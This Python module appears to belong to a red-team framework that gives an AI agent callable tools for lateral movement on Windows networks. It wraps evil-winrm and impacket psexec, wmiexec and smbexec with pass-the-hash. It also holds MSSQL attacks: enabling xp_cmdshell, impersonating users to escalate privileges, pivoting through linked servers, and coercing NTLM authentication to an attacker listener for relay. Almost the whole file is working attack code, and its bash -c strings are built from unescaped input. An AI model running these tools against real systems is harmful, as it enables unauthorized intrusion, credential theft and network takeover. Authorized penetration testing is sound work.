"""Red Team lateral movement and remote execution tools.

This module provides toolsets for:
- WinRM (evil-winrm)
- PsExec, WMIExec, SMBExec
- MSSQL attacks
"""

import logging
from typing import ClassVar

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset

from ares.tools.red.common import (
    PLACEHOLDER_PASSWORDS,
    AnyRedTeamState,
    check_port,
    resolve_password,
    run_tool,
)

logger = logging.getLogger(__name__)


class LateralMovementTools(Toolset):
    """Tools for lateral movement and remote access.

    These tools enable interactive sessions and command execution
    on compromised systems.
    """

    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _check_port(self, target: str, port: int, timeout_seconds: int = 5) -> bool:
        return check_port(target, port, timeout_seconds)

    def _check_smb_exec(
        self,
        target: str,
        username: str,
        password: str | None,
        hash: str | None,
        domain: str | None,
    ) -> bool | None:
        if not (password or hash):
            return None
        cmd = ["netexec", "smb", target, "-u", username]
        if password:
            cmd.extend(["-p", password])
        elif hash:
            cmd.extend(["-H", hash])
        if domain:
            cmd.extend(["-d", domain])
        cmd.extend(["-x", "whoami"])
        try:
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
        except Exception:
            return None
        output = (stdout or "") + ("\n" + stderr if stderr else "")
        lowered = output.lower()
        if "pwn3d" in lowered or "command output" in lowered or "whoami" in lowered:
            return True
        if "access denied" in lowered or "nt_status_access_denied" in lowered:
            return False
        if "logon failure" in lowered or "status_logon_failure" in lowered:
            return False
        return None

    @dn.tool_method
    def evil_winrm(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        command: str | None = None,
    ) -> str:
        """
        Execute command or establish WinRM session (evil-winrm).

        WinRM (Windows Remote Management) enables remote PowerShell access.
        Use for lateral movement after obtaining credentials.

        Args:
            target: Target machine IP
            username: Username for authentication
            password: Password (optional if using hash)
            hash: NTLM hash for pass-the-hash (optional if using password)
            domain: Domain for authentication (optional)
            command: Command to execute (if None, would start interactive session)

        Returns:
            Command output or session status

        Example:
            >>> evil_winrm("192.168.56.22", "admin", password="pass")  # pragma: allowlist secret
            >>> evil_winrm("192.168.56.22", "admin", hash="aad3b435...")
        """
        if not (password or hash):
            return "[!] Error: Either password or hash must be provided"

        if not (self._check_port(target, 5985) or self._check_port(target, 5986)):
            logger.warning("WinRM not reachable on %s (ports 5985/5986 closed)", target)
        resolved_password = self._resolve_password(username, domain, password)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = ["evil-winrm", "-i", target, "-u", username]

        if resolved_password:
            cmd.extend(["-p", resolved_password])
        elif hash:
            cmd.extend(["-H", hash])
        if command:
            cmd.extend(["-c", command])
        else:
            cmd.extend(["-c", "whoami && hostname && ipconfig"])

        try:
            logger.info(f"[*] Connecting to {target} via WinRM")
            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if (
                returncode == 0
                or "nt authority\\system" in result.lower()
                or username.lower() in result.lower()
            ):
                logger.info(f"[+] WinRM session to {target} successful!")

            return result

        except Exception as e:
            return f"evil-winrm failed: {e}"

    @dn.tool_method
    def psexec(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        command: str = "cmd.exe",
    ) -> str:
        """
        Execute command via PsExec (impacket-psexec).

        PsExec enables remote command execution via SMB. Requires admin access.
        More reliable than WinRM in some environments.

        Args:
            target: Target machine IP
            username: Username with admin access
            password: Password (optional if using hash)
            hash: NTLM hash for pass-the-hash (optional)
            domain: Domain for authentication
            command: Command to execute (default: cmd.exe)

        Returns:
            Command output

        Example:
            >>> psexec("192.168.56.22", "admin", password="pass", command="whoami")  # pragma: allowlist secret
        """
        resolved_password = self._resolve_password(username, domain, password)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        precheck = self._check_smb_exec(target, username, resolved_password, hash, domain)
        if precheck is False:
            return "[!] SMB exec precheck failed; admin access likely missing."

        if hash and not resolved_password:
            target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
        else:
            target_string = f"{domain}/{username}" if domain else username
            target_string += f":{resolved_password}@{target}" if resolved_password else f"@{target}"

        cmd = ["impacket-psexec", target_string]

        if hash:
            cmd.extend(["-hashes", f":{hash}"])

        cmd.extend(["-c", command])

        try:
            logger.info(f"[*] Executing via PsExec on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"PsExec failed: {e}"

    @dn.tool_method
    def wmiexec(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        command: str = "whoami",
    ) -> str:
        """
        Execute command via WMI (impacket-wmiexec).

        WMI execution is often more stealthy than PsExec.
        """
        precheck = self._check_smb_exec(target, username, password, hash, domain)
        if precheck is False:
            return "[!] SMB exec precheck failed; admin access likely missing."

        if hash and not password:
            target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
        else:
            target_string = f"{domain}/{username}" if domain else username
            target_string += f":{password}@{target}" if password else f"@{target}"

        cmd = ["impacket-wmiexec", target_string]
        if hash:
            cmd.extend(["-hashes", f":{hash}"])
        cmd.extend([command])

        try:
            logger.info(f"[*] Executing via WMI on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
            return stdout + "\n" + (stderr or "")
        except Exception as e:
            return f"WMIExec failed: {e}"

    @dn.tool_method
    def smbexec(
        self,
        target: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        domain: str | None = None,
        command: str = "whoami",
    ) -> str:
        """
        Execute command via SMB service (impacket-smbexec).

        SMBExec creates a service per command and retrieves output over SMB.
        """
        precheck = self._check_smb_exec(target, username, password, hash, domain)
        if precheck is False:
            return "[!] SMB exec precheck failed; admin access likely missing."

        if hash and not password:
            target_string = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
        else:
            target_string = f"{domain}/{username}" if domain else username
            target_string += f":{password}@{target}" if password else f"@{target}"

        cmd = ["impacket-smbexec", target_string]
        if hash:
            cmd.extend(["-hashes", f":{hash}"])
        cmd.extend([command])

        try:
            logger.info(f"[*] Executing via SMBExec on {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
            return stdout + "\n" + (stderr or "")
        except Exception as e:
            return f"SMBExec failed: {e}"


class MSSQLTools(Toolset):
    """Tools for MSSQL exploitation and privilege escalation.

    These tools target MSSQL servers for command execution, privilege escalation,
    and lateral movement through linked servers.
    """

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def mssql_command(
        self,
        target: str,
        username: str,
        password: str,
        command: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Execute commands on MSSQL server via xp_cmdshell.

        Use when you have sysadmin privileges on an MSSQL server.
        xp_cmdshell must be enabled (use mssql_enable_xp_cmdshell first if needed).

        Args:
            target: MSSQL server IP
            username: Username for authentication
            password: Password for authentication
            command: System command to execute
            domain: Domain for Windows auth (optional)
            windows_auth: Use Windows authentication (default: True)

        Returns:
            Command output from the target system

        Example:
            >>> mssql_command("192.168.56.22", "sa", "password", "whoami", windows_auth=False)  # pragma: allowlist secret
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional command execution for MSSQL pentest
        cmd_string = f"echo \"xp_cmdshell '{command}'\" | mssqlclient.py {target_string}"
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Executing command on MSSQL: {command}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"MSSQL command execution failed: {e}"

    @dn.tool_method
    def mssql_enable_xp_cmdshell(
        self,
        target: str,
        username: str,
        password: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Enable xp_cmdshell on an MSSQL server for command execution.

        Requires sysadmin privileges on the MSSQL server.
        After enabling, use mssql_command to execute system commands.

        Args:
            target: MSSQL server IP
            username: Username with sysadmin privileges
            password: Password for authentication
            domain: Domain for Windows auth (optional)
            windows_auth: Use Windows authentication (default: True)

        Returns:
            xp_cmdshell enablement result

        Example:
            >>> mssql_enable_xp_cmdshell("192.168.56.22", "user", "pass", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional SQL for MSSQL pentest
        enable_commands = """
sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
"""
        cmd_string = f'echo "{enable_commands}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Enabling xp_cmdshell on {target}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "configuration option" in result.lower() or "changed" in result.lower():
                logger.info("[+] xp_cmdshell enabled!")
                result = (
                    "\u2705 xp_cmdshell ENABLED!\n"
                    "\u2192 Use mssql_command to execute system commands\n\n" + result
                )

            return result

        except Exception as e:
            return f"xp_cmdshell enable failed: {e}"

    @dn.tool_method
    def mssql_impersonate(
        self,
        target: str,
        username: str,
        password: str,
        impersonate_user: str,
        query: str,
        domain: str | None = None,
        windows_auth: bool = True,
        database: str | None = None,
    ) -> str:
        """
        Impersonate another SQL user for privilege escalation.

        MSSQL allows impersonation if EXECUTE AS permissions are granted.
        Use to escalate from low-privileged SQL login to sysadmin.

        Args:
            target: MSSQL server IP
            username: Current username
            password: Password for authentication
            impersonate_user: User to impersonate (e.g., 'sa', 'dbo')
            query: SQL query to execute as impersonated user
            domain: Domain for Windows auth (optional)
            windows_auth: Use Windows authentication
            database: Target database for impersonation (optional)

        Returns:
            Query result executed as the impersonated user

        Example:
            >>> mssql_impersonate("192.168.56.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        sql_commands = []
        if database:
            sql_commands.append(f"USE [{database}];")
        sql_commands.append(f"EXECUTE AS USER = '{impersonate_user}';")
        sql_commands.append(query)
        sql_commands.append("REVERT;")
        sql_script = " ".join(sql_commands)

        cmd_string = f'echo "{sql_script}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(
                "[*] Executing query as %s on %s (db=%s)",
                impersonate_user,
                target,
                database or "default",
            )
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
            return stdout + "\n" + (stderr or "")

        except Exception as e:
            return f"mssql_execute_as_user failed: {e}"

    @dn.tool_method
    def mssql_enum_linked_servers(
        self,
        target: str,
        username: str,
        password: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Enumerate MSSQL linked servers for cross-server pivoting.

        Linked servers enable SQL queries across database instances and can be
        chained for privilege escalation across servers, domains, and forests.

        Args:
            target: MSSQL server IP
            username: Username for authentication
            password: Password for authentication
            domain: Domain for Windows auth
            windows_auth: Use Windows authentication

        Returns:
            List of linked servers with access information

        Example:
            >>> mssql_enum_linked_servers("192.168.56.22", "user", "pass", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional SQL for MSSQL pentest recon
        sql_query = """
SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1;
EXEC sp_linkedservers;
"""
        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Enumerating linked servers on {target}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "linked" in result.lower() or "srv_name" in result.lower():
                logger.info("[+] Linked servers found!")
                result = (
                    "\ud83d\udccb LINKED SERVERS FOUND\n"
                    "\u2192 Use mssql_exec_linked to execute queries on linked servers\n"
                    "\u2192 Chain across servers for cross-domain/forest pivoting\n\n" + result
                )

            return result

        except Exception as e:
            return f"Linked server recon failed: {e}"

    @dn.tool_method
    def mssql_exec_linked(
        self,
        target: str,
        username: str,
        password: str,
        linked_server: str,
        query: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Execute query on a linked MSSQL server (cross-server pivoting).

        Use after finding linked servers with mssql_enum_linked_servers.
        Can enable xp_cmdshell on remote servers through the link chain.

        Args:
            target: Local MSSQL server IP (where you have access)
            username: Username for local authentication
            password: Password for authentication
            linked_server: Name of the linked server to execute on
            query: SQL query to execute (or 'xp_cmdshell ''command''')
            domain: Domain for Windows auth
            windows_auth: Use Windows authentication

        Returns:
            Query result from the linked server

        Example:
            >>> mssql_exec_linked("192.168.56.22", "user", "pass", "LINKED_SRV", "SELECT SYSTEM_USER", "domain.local")
            >>> mssql_exec_linked("192.168.56.22", "user", "pass", "LINKED_SRV", "EXEC xp_cmdshell 'whoami'", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional SQL for MSSQL pentest recon
        sql_query = f"EXEC ('{query}') AT [{linked_server}];"

        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Executing query on linked server {linked_server}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "system_user" in result.lower() or "nt authority" in result.lower():
                logger.info(f"[+] Successful execution on {linked_server}!")
                result = (
                    f"\ud83d\udea8 LINKED SERVER EXECUTION SUCCESSFUL ON {linked_server}!\n"
                    "\u2192 Try enabling xp_cmdshell: sp_configure 'xp_cmdshell', 1\n"
                    "\u2192 Check for further linked servers to chain\n\n" + result
                )

            return result

        except Exception as e:
            return f"Linked server execution failed: {e}"

    @dn.tool_method
    def mssql_ntlm_coerce(
        self,
        target: str,
        username: str,
        password: str,
        listener_ip: str,
        domain: str | None = None,
        windows_auth: bool = True,
    ) -> str:
        """
        Coerce NTLM authentication from MSSQL server for relay attacks.

        Forces the SQL Server machine account to authenticate to your listener.
        Useful for relaying to LDAPS for RBCD or shadow credentials.

        Args:
            target: MSSQL server IP
            username: Username for authentication
            password: Password for authentication
            listener_ip: Your listener IP (running Responder/ntlmrelayx)
            domain: Domain for Windows auth
            windows_auth: Use Windows authentication

        Returns:
            Coercion attempt result

        Example:
            >>> mssql_ntlm_coerce("192.168.56.22", "user", "pass", "192.168.56.100", "domain.local")
        """
        if domain:
            target_string = f"{domain}/{username}:{password}@{target}"
        else:
            target_string = f"{username}:{password}@{target}"

        # nosec B608 - intentional SQL for MSSQL pentest
        sql_query = f"EXEC xp_dirtree '\\\\\\\\{listener_ip}\\\\share';"

        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
        if windows_auth:
            cmd_string += " -windows-auth"

        try:
            logger.info(f"[*] Coercing NTLM auth from {target} to {listener_ip}")
            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            return (
                f"\ud83d\udccb MSSQL NTLM COERCION ATTEMPTED\n"
                f"\u2192 SQL Server should attempt to authenticate to {listener_ip}\n"
                "\u2192 Check your Responder/ntlmrelayx for captured auth\n"
                "\u2192 Machine account hash can be relayed to LDAPS\n\n" + result
            )

        except Exception as e:
            return f"MSSQL NTLM coercion failed: {e}"
